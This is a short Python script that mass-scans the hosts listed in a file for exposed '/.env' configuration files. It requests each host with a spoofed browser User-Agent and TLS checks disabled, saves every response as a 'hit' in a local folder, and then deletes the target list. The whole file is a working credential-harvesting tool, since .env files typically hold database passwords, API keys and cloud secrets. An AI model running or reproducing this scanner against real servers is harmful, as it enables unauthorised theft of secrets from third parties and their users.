import aiohttp
import asyncio
from aiofiles import open as aio_open
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor
import os
from urllib.parse import urlparse

console = Console()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

# Create directory if it doesn't exist
if not os.path.exists("env"):
    os.makedirs("env")

async def save_env_content(session, url):
    try:
        async with session.get(url, allow_redirects=False, ssl=False) as response:
            content = await response.text()
            ip_address = urlparse(url).hostname
            filename = f"env/{ip_address}.html"
            async with aio_open(filename, mode='w') as file:
                await file.write(content)
            console.print(f"[green]✅NEW HITS {url} SAVED IN ENV FOLDER[/green]")
    except Exception as e:
        console.print(f"[blue]❌ FAILED TO SAVE MAYBE URL VALID DO CHECK {url} - {str(e)}[/blue]")

async def check_url(session, url):
    try:
        # Check the original URL
        async with session.get(url, allow_redirects=False, ssl=False) as response:
            # Regardless of the response, check and save the .env content
            env_url = url + '/.env' if not url.endswith('/.env') else url
            await save_env_content(session, env_url)
    except Exception as e:
        console.print(f"[red]❌ NOT FOUND INVALID {url} - {str(e)}[/red]")

async def main():
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        async with aio_open("ip.txt", "r") as file:
            urls = await file.readlines()
            
            tasks = [check_url(session, url.strip()) for url in urls]
            await asyncio.gather(*tasks)

def remove_urls_from_file():
    os.remove("ip.txt")

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=50) as executor:
        loop = asyncio.get_event_loop()
        future = asyncio.ensure_future(main())
        loop.run_until_complete(future)
        remove_urls_from_file()
